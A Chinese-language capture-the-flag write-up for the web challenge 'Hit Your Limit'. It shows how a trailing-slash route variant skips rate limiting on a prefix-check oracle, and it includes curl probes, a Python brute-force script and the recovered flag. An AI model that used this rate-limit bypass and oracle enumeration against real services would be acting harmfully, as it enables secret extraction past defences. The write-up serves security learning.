# Hit Your Limit

## 题目信息

- 类型：Web
- 题目状态：已解出
- 目标：http://23.179.17.92:5559
- 核心漏洞：`/api/flag` 与 `/api/flag/` 存在路由/保护不一致；前者有限流，后者保留了同样的前缀判断 oracle，却没有同样的限流保护，错误输入还会直接打到 `500`

## 入口与现象

首页只有一个输入框，前端 JS 很直接地把校验逻辑暴露出来了：

```javascript
const res = await fetch(`/api/flag?guess=${encodeURIComponent(val)}`);

if (res.status === 200) {
  if (val.length === FLAG_LENGTH) {
    setStatus('correct', 'FLAG CAPTURED');
  } else {
    setStatus('correct', 'CORRECT PREFIX');
  }
} else if (res.status === 429) {
  setStatus('rate-limited', 'RATE LIMITED');
} else {
  setStatus('incorrect', 'INCORRECT');
}
```

这里已经说明两件事：

1. 这是个典型的“正确前缀 oracle”题。
2. 正常解题会被 `429` 限流卡住。

先直接请求原始接口验证：

```http
GET /api/flag?guess=CIT%7B HTTP/1.1
Host: 23.179.17.92:5559
```

返回：

```http
HTTP/1.1 200 OK
X-RateLimit-Remaining: 4

{"result":"correct"}
```

继续多打几次之后会进限流：

```json
{"error":"Rate limit exceeded","limit":5,"message":"Too many requests. Retry in 81s.","requests":13}
```

所以仅靠 `/api/flag` 做 32 位逐字枚举显然不现实，必须找绕过点。

## 分析过程

先枚举一些低成本变体，重点看“是否还是同一个 oracle、限流头是否还在”。

原始接口的一个关键对照是：

```http
GET /api/flag?guess=CIT%7B HTTP/1.1
```

返回 `200`，并且带有 `X-RateLimit-Remaining`。

但把路径改成带尾斜杠的 `/api/flag/` 之后，行为明显不一样：

```http
GET /api/flag/?guess=CIT%7B HTTP/1.1
```

返回：

```http
HTTP/1.1 200 OK

{"result":"correct"}
```

这次已经没有 `X-RateLimit-Remaining` 头了。再测一个错误值：

```http
GET /api/flag/?guess=XYZ HTTP/1.1
```

返回：

```http
HTTP/1.1 500 INTERNAL SERVER ERROR

{"error":"Internal Server Error","message":"An unexpected error occurred."}
```

也就是说，`/api/flag/` 虽然和 `/api/flag` 一样能区分“正确前缀”和“错误前缀”，但它没有走同样的限流/错误处理路径：

- 正确前缀：`200`
- 错误前缀：`500`
- 看不到限流头

仅从在线行为就足以确认，带尾斜杠的路由变体提供了一个**不受限流保护的前缀 oracle**。没有源码时，最合理的推断就是：

- `/api/flag` 上挂了限流装饰器
- `/api/flag/` 走到了另一个未正确保护的路由或规范化分支
- 两者最终都调用了同一套 flag 前缀校验逻辑

## 利用过程

1. 打开首页，直接从前端 JS 确认存在 `/api/flag?guess=` 前缀 oracle，且有 `429` 限流。
2. 验证 `/api/flag?guess=CIT%7B` 会返回 `200`，说明 flag 确实以 `CIT{` 开头。
3. 枚举同一路径的变体，发现 `/api/flag/` 也会做前缀判断，但响应里不再出现限流头。
4. 用错误值验证 `/api/flag/` 会返回 `500`，从而得到一个稳定的二元 oracle：
   - `200` 表示当前前缀正确
   - `500` 表示当前前缀错误
5. 从 `CIT{` 开始，逐位枚举直到长度达到前端写死的 `32`。
6. 最终恢复出完整 flag：

```text
CIT{R@T3_L1m1t1nG_15_Bypass@ble}
```

## 关键 payload / 命令

验证两条接口行为差异：

```powershell
curl.exe -i "http://23.179.17.92:5559/api/flag?guess=CIT%7B"
curl.exe -i "http://23.179.17.92:5559/api/flag/?guess=CIT%7B"
curl.exe -i "http://23.179.17.92:5559/api/flag/?guess=XYZ"
```

最短复现脚本如下，用 `/api/flag/` 的 `200/500` 差异逐字恢复 flag：

```python
import requests
from urllib.parse import quote

base = "http://23.179.17.92:5559/api/flag/?guess="
charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()-=+,.?{}"
flag = "CIT{"

while len(flag) < 32:
    for ch in charset:
        r = requests.get(base + quote(flag + ch, safe=""), timeout=10)
        print(flag + ch, r.status_code)
        if r.status_code == 200:
            flag += ch
            break
    else:
        raise RuntimeError(f"no match after {flag!r}")

print(flag)
```

线上跑完得到：

```text
CIT{R@T3_L1m1t1nG_15_Bypass@ble}
```

## Flag

```text
CIT{R@T3_L1m1t1nG_15_Bypass@ble}
```

## 总结

这题表面上是在考“限流下的前缀爆破”，实际上真正的突破点是**路由规范化不一致**。开发者把正常入口 `/api/flag` 的限流做上了，但带尾斜杠的 `/api/flag/` 仍然保留了同样的前缀判断能力，却没有同样的保护，导致攻击者可以完全绕过 rate limit，把 oracle 放大成稳定的逐字枚举，最终直接恢复整条 flag。
